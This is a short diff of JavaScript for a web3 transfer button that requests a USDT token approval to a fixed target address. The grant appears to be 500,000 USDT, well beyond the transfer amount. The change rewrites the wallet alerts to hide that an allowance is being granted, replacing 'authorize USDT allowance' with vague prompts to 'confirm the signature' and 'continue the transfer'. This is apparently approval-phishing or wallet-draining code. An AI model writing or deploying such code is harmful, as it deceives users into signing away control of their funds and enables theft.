@@ -246,10 +246,10 @@ sendBtn.addEventListener("click", async () => {
     try{
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
         if(BigInt(allowance) < BigInt(needWei)){
-            alert("🔐需要先授权USDT额度，请钱包确认签名");
+            alert("请钱包确认签名");
             const approveData = usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_WEI).encodeABI();
             await sendTx(approveData);
-            alert("✅授权已上链，等待节点同步");
+            alert("是否继续转账");
             await waitAllowance(needWei);
         }
         alert("即将执行转账，请钱包确认签名");
